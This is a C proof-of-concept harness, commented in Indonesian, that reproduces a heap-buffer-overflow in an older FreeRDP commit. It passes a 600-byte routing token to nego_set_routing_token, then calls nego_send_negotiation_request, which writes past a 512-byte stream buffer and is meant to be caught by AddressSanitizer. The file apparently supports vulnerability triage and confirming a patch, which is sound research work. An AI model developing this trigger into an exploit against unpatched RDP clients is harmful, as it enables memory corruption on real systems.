/*
 * harness_nego.c — PoC dinamis untuk klaster "nego->RoutingTokenLength" (hasil sift/triage).
 *
 * Membuktikan jalur yang ditemukan analisis statis pada revisi RENTAN — commit artikel Quarkslab
 * 993499447. Di master sekarang sudah ditambal (ada Stream_EnsureRemainingCapacity); di commit itu
 * TIDAK ada, jadi:
 *
 *   nego_set_routing_token(nego, token, len)  → nego->RoutingTokenLength = len (data penyerang)
 *   nego_send_negotiation_request(nego)       → Stream_New(nullptr, 512) lalu
 *                                               Stream_Write(s, token, len)   ← tanpa cek kapasitas
 *   ⇒ token > 512 B (plus 12 B TPDU) → penulisan melewati alokasi → ASan: heap-buffer-overflow
 *
 * Catatan API: nego_new() menerima rdpTransport*, dan nego.h/transport.h hidup di libfreerdp/core
 * (header internal, tak diinstal) → build butuh -I ke pohon sumber + link statis.
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <freerdp/freerdp.h>
#include <freerdp/settings.h>
#include <winpr/wlog.h>

#include "transport.h" /* libfreerdp/core/transport.h */
#include "nego.h"      /* libfreerdp/core/nego.h */

#define TOKEN_LEN 600 /* > 512 (alokasi Stream_New di nego_send_negotiation_request) */

int main(void)
{
	WLog_SetLogLevel(WLog_GetRoot(), WLOG_WARN);

	unsigned char* token = (unsigned char*)malloc(TOKEN_LEN);
	if (!token)
		return 3;
	memset(token, 'A', TOKEN_LEN);
	memcpy(token, "Cookie: mstshash=poc\r\n", 22); /* menyerupai token routing nyata */

	freerdp* instance = freerdp_new();
	if (!instance)
	{
		fprintf(stderr, "[harness] freerdp_new gagal\n");
		return 3;
	}
	instance->ContextSize = sizeof(rdpContext);
	if (!freerdp_context_new(instance))
	{
		fprintf(stderr, "[harness] freerdp_context_new gagal\n");
		return 3;
	}
	rdpContext* context = instance->context;
	if (!context)
	{
		fprintf(stderr, "[harness] context kosong\n");
		return 3;
	}
	fprintf(stdout, "[harness] instance+context siap (settings=%p)\n", (void*)context->settings);
	fflush(stdout);

	rdpTransport* transport = transport_new(context);
	if (!transport)
	{
		fprintf(stderr, "[harness] transport_new gagal\n");
		return 3;
	}

	rdpNego* nego = nego_new(transport);
	if (!nego)
	{
		fprintf(stderr, "[harness] nego_new gagal\n");
		return 3;
	}

	fprintf(stdout, "[harness] menyuntikkan routing token %d byte (batas alokasi 512)\n", TOKEN_LEN);
	fflush(stdout);
	if (!nego_set_routing_token(nego, token, (UINT32)TOKEN_LEN))
	{
		fprintf(stderr, "[harness] nego_set_routing_token gagal\n");
		return 2;
	}
	fprintf(stdout, "[harness] RoutingTokenLength tersimpan; memanggil nego_send_negotiation_request\n");
	fflush(stdout);

	(void)nego_send_negotiation_request(nego); /* ← overflow terjadi di sini (revisi rentan) */

	fprintf(stdout, "[harness] selesai TANPA crash — jalur sink tidak tercapai (cek revisi/API)\n");
	fflush(stdout);
	return 0;
}
